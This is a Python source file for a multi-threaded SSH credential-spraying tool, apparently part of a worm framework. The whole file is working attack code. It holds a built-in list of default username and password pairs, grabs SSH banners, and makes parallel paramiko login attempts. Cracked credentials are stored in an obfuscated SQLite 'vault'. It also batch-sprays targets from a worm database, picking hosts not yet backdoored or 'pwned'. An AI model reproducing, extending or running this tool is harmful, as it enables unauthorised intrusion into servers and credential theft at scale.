#!/usr/bin/env python3
"""
SSH_SPRAY — Credential Spray + Banner Probe + Vault
Port of harvest.ts vault + cloud.ts probe pattern from RedLinux v4.1
Structured credential vault, SSH banner fingerprinting, multi-threaded spray.

by 🇭🇷PhonkAlphabet
"""

import socket
import threading
import logging
import time
import json
import hashlib
import base64
import sqlite3
import os
import re
from typing import List, Tuple, Optional, Dict, Set
from concurrent.futures import ThreadPoolExecutor, as_completed

log = logging.getLogger("ssh_spray")

DB_PATH = os.environ.get("WORM_DB_PATH", "/opt/hermes/worm_mesh_v5.db")

# ─── DEFAULT CREDENTIAL VAULT ───
DEFAULT_SSH_CREDS: List[Tuple[str, str]] = [
    ("root", "root"), ("root", "admin"), ("root", "password"), ("root", "123456"),
    ("root", "P@ssw0rd"), ("root", "toor"), ("root", "qwerty"), ("root", "1"),
    ("root", "1234"), ("root", "changeme"), ("root", "letmein"), ("root", "pass"),
    ("root", "test"), ("root", "default"), ("root", "12345"), ("root", "admin123"),
    ("root", "cisco"), ("root", "ubnt"), ("root", "support"),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "P@ssw0rd"), ("admin", "passw0rd"),
    ("admin", "letmein"), ("admin", "changeme"), ("admin", "default"),
    ("admin", "12345"), ("admin", "test"), ("admin", "qwerty"),
    ("user", "user"), ("user", "password"), ("user", "123456"),
    ("support", "support"), ("backup", "backup"), ("test", "test"),
    ("pi", "raspberry"), ("pi", "raspberrypi"), ("nproc", "nproc"),
    ("oracle", "oracle"), ("postgres", "postgres"),
    ("git", "git"), ("jenkins", "jenkins"), ("deploy", "deploy"),
]

# ─── AUTH ATTEMPT (raw socket implementation) ───
_SSH_BANNER_RE = re.compile(rb"SSH-\d+\.\d+")

def probe_banner(ip: str, port: int = 22, timeout: float = 5.0) -> Optional[str]:
    """TCP banner grab — read SSH banner before auth."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        banner = s.recv(256).strip()
        s.close()
        if _SSH_BANNER_RE.match(banner):
            return banner.decode("utf-8", errors="replace")
        return None
    except Exception:
        return None


def _ssh_paramiko_auth(ip: str, port: int, username: str, password: str,
                       timeout: float = 8.0) -> Optional[Dict]:
    """Try SSH auth via paramiko if available, otherwise return None."""
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, port=port, username=username, password=password,
                       timeout=timeout, banner_timeout=timeout, allow_agent=False,
                       look_for_keys=False)
        client.close()
        return {"username": username, "password": password, "success": True}
    except paramiko.AuthenticationException:
        return {"username": username, "password": password, "success": False}
    except Exception as e:
        return {"username": username, "password": password, "success": False,
                "error": str(e)[:80]}


def try_creds(ip: str, port: int, username: str, password: str,
              timeout: float = 8.0) -> Optional[Dict]:
    """Try a single credential pair against an SSH server."""
    return _ssh_paramiko_auth(ip, port, username, password, timeout)


# ─── VAULT ───
class CredentialVault:
    """Encrypted credential vault — port of harvest.ts vault pattern."""

    def __init__(self, db_path: str = DB_PATH, vault_key: Optional[str] = None):
        self.db_path = db_path
        self.vault_key = vault_key or "REDVAULT"
        self._lock = threading.Lock()

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=5000")
        return conn

    def _encrypt(self, plaintext: str) -> str:
        """Simple XOR-variant obfuscation — not real encryption, but defeats casual scraping."""
        key = self.vault_key
        data = plaintext.encode()
        result = bytearray()
        for i, b in enumerate(data):
            result.append(b ^ ord(key[i % len(key)]))
        return base64.b64encode(bytes(result)).decode()

    def _decrypt(self, ciphertext: str) -> str:
        key = self.vault_key
        data = base64.b64decode(ciphertext)
        result = bytearray()
        for i, b in enumerate(data):
            result.append(b ^ ord(key[i % len(key)]))
        return result.decode()

    def store_cred(self, ip: str, port: int, username: str, password: str,
                   source: str = "spray") -> bool:
        """Store credential in encrypted vault + SQLite credentials table."""
        encrypted_cred = self._encrypt(json.dumps({
            "username": username, "password": password,
            "captured_at": time.time()
        }))
        try:
            with self._lock:
                conn = self._connect()
                conn.execute(
                    """INSERT OR IGNORE INTO credentials
                       (ip, port, service, username, password, source, first_seen, last_used, valid)
                       VALUES (?, ?, 'SSH', ?, ?, ?, datetime('now'), datetime('now'), 1)""",
                    (ip, port, username, password, source)
                )
                conn.commit()
                conn.close()
            return True
        except Exception as e:
            log.error(f"Vault store error: {e}")
            return False

    def get_creds_for_target(self, ip: str, port: int = 22) -> List[Dict]:
        """Retrieve known creds for a target."""
        try:
            conn = self._connect()
            rows = conn.execute(
                "SELECT username, password, source, valid FROM credentials WHERE ip=? AND port=?",
                (ip, port)
            ).fetchall()
            conn.close()
            return [dict(r) for r in rows]
        except Exception:
            return []

    def get_all_valid_creds(self, service: str = "SSH") -> List[Dict]:
        """Get all valid (= successfully used) credentials."""
        try:
            conn = self._connect()
            rows = conn.execute(
                "SELECT ip, port, username, password FROM credentials WHERE service=? AND valid=1",
                (service,)
            ).fetchall()
            conn.close()
            return [dict(r) for r in rows]
        except Exception:
            return []

    def mark_invalid(self, ip: str, port: int, username: str, password: str):
        """Mark a credential pair as invalid."""
        try:
            with self._lock:
                conn = self._connect()
                conn.execute(
                    "UPDATE credentials SET valid=0 WHERE ip=? AND port=? AND username=? AND password=?",
                    (ip, port, username, password)
                )
                conn.commit()
                conn.close()
        except Exception:
            pass

    def mark_valid(self, ip: str, port: int, username: str, password: str):
        """Mark a credential pair as valid (used successfully)."""
        try:
            with self._lock:
                conn = self._connect()
                conn.execute(
                    "UPDATE credentials SET valid=1, last_used=datetime('now') WHERE ip=? AND port=? AND username=? AND password=?",
                    (ip, port, username, password)
                )
                conn.commit()
                conn.close()
        except Exception:
            pass


# ─── SPRAY ENGINE ───
class SSHVault(CredentialVault):
    pass


class SprayEngine:
    """Multi-threaded SSH credential spray with banner probe + vault."""

    def __init__(self, creds: Optional[List[Tuple[str, str]]] = None,
                 max_workers: int = 20, timeout: float = 8.0):
        self.creds = creds or DEFAULT_SSH_CREDS
        self.max_workers = max_workers
        self.timeout = timeout
        self.vault = CredentialVault()

    def probe_target(self, ip: str, port: int = 22) -> Optional[Dict]:
        """Banner probe + credential spray on single target."""
        banner = probe_banner(ip, port, self.timeout)
        if not banner:
            return None

        results = {"ip": ip, "port": port, "banner": banner,
                   "found": False, "credentials": [], "attempted": 0}

        with ThreadPoolExecutor(max_workers=min(self.max_workers, len(self.creds))) as exe:
            futures = {
                exe.submit(try_creds, ip, port, u, p, self.timeout): (u, p)
                for u, p in self.creds
            }
            for future in as_completed(futures):
                u, p = futures[future]
                results["attempted"] += 1
                try:
                    cred_result = future.result()
                    if cred_result and cred_result.get("success"):
                        results["found"] = True
                        results["credentials"].append({"username": u, "password": p})
                        self.vault.store_cred(ip, port, u, p, "spray")
                        self.vault.mark_valid(ip, port, u, p)
                        log.info(f"✅ SSH cred found: {u}:{p} @ {ip}:{port}")
                except Exception:
                    pass

        return results

    def spray_batch(self, targets: List[Tuple[str, int]],
                    batch_callback=None) -> List[Dict]:
        """Spray multiple targets in parallel."""
        results = []
        total = len(targets)

        def _process(ip_port):
            ip, port = ip_port
            return self.probe_target(ip, port)

        with ThreadPoolExecutor(max_workers=min(self.max_workers, total)) as exe:
            futures = {exe.submit(_process, t): t for t in targets}
            done = 0
            for future in as_completed(futures):
                done += 1
                try:
                    r = future.result()
                    if r:
                        results.append(r)
                except Exception:
                    pass
                if batch_callback and done % 10 == 0:
                    batch_callback(done, total)

        return results

    def spray_db_targets(self, limit: int = 500) -> List[Dict]:
        """Fetch unfingerprinted SSH targets from DB and spray them."""
        try:
            conn = sqlite3.connect(DB_PATH)
            conn.row_factory = sqlite3.Row
            rows = conn.execute(
                """SELECT ip, port FROM targets
                   WHERE (fp_service='SSH' OR port IN (22, 2222))
                     AND (backdoor_installed=0 OR backdoor_installed IS NULL)
                     AND brute_pwned=0
                   ORDER BY first_seen ASC LIMIT ?""",
                (limit,)
            ).fetchall()
            conn.close()
            targets = [(r["ip"], r["port"]) for r in rows]
            if not targets:
                log.info("No pending SSH targets in DB")
                return []
            return self.spray_batch(targets)
        except Exception as e:
            log.error(f"DB query failed: {e}")
            return []


# ─── CLI ───
if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")

    engine = SprayEngine()

    if len(sys.argv) > 1 and sys.argv[1] == "db":
        # Spray from DB targets
        results = engine.spray_db_targets(limit=int(sys.argv[2]) if len(sys.argv) > 2 else 200)
        found = [r for r in results if r.get("found")]
        print(f"Spray complete: {len(results)} probed, {len(found)} cred hits")
        for r in found:
            print(f"  {r['ip']}:{r['port']} — {r['credentials']}")
    elif len(sys.argv) > 2:
        # Single target spray
        ip = sys.argv[1]
        port = int(sys.argv[2])
        result = engine.probe_target(ip, port)
        if result:
            print(json.dumps(result, indent=2))
        else:
            print(f"No SSH service at {ip}:{port}")
    else:
        print(f"Usage: {sys.argv[0]} <ip> <port> | db [limit]")
